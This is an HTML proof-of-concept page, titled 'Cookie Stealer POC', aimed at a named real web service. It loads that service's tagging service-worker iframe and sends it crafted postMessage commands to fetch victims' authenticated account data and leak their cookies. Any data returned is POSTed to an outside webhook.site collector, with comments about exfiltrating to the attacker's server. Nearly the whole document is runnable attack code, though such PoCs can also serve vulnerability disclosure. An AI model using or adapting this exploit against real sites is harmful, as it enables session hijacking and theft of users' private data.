<html>
<head>
  <meta charset="UTF-8" />
  <title>Cookie Stealer POC</title>
</head>
<body>
  <h1>Exploit Running...</h1>
  <div id="log"></div>

  <script>
    const log = (msg) => {
      console.log(msg);
      document.getElementById('log').innerHTML += `<p>${msg}</p>`;
    };

    const iframe = document.createElement('iframe');
    iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me&1p=1';
    document.body.appendChild(iframe);

    // Listen for responses
    window.addEventListener('message', (e) => {
      log('[MESSAGE] Origin: ' + e.origin);
      log('[MESSAGE] Data: ' + JSON.stringify(e.data));

      // If we got a response with data
      if (e.data?.result?.data) {
        log('[SUCCESS] Stolen data received!');
        log('[DATA] ' + e.data.result.data);
        
        // Exfiltrate to your server
        fetch('https://webhook.site/a90fcf0f-218a-46ef-a113-6bc249382768/stolen', {
          method: 'POST',
          body: JSON.stringify({
            stolen: e.data.result.data,
            timestamp: new Date().toISOString()
          })
        });
      }
    });

    iframe.onload = () => {
      log('[LOADED] Iframe loaded');

      setTimeout(() => {
        // Attack 1: Make victim fetch their own authenticated endpoint
        log('[ATTACK1] Fetching victim account data...');
        iframe.contentWindow.postMessage({
          type: 1,
          clientId: 'steal-data',
          command: {
            commandType: 0,
            params: {
              // url: 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?test',
              url: 'https://daemoon.me',
              method: 0,
              processResponse: true
            }
          }
        }, '*');

        // Attack 2: Send victim's cookies to your server directly
        // (Check your collaborator logs for the Cookie header)
        setTimeout(() => {
          log('[ATTACK2] Sending cookies to collaborator...');
          iframe.contentWindow.postMessage({
            type: 1,
            clientId: 'send-cookies',
            command: {
              commandType: 0,
              params: {
                url: 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?badrooo',
                method: 0
              }
            }
          }, '*');
        }, 1000);

      }, 500);
    };
  </script>
</body>
</html>
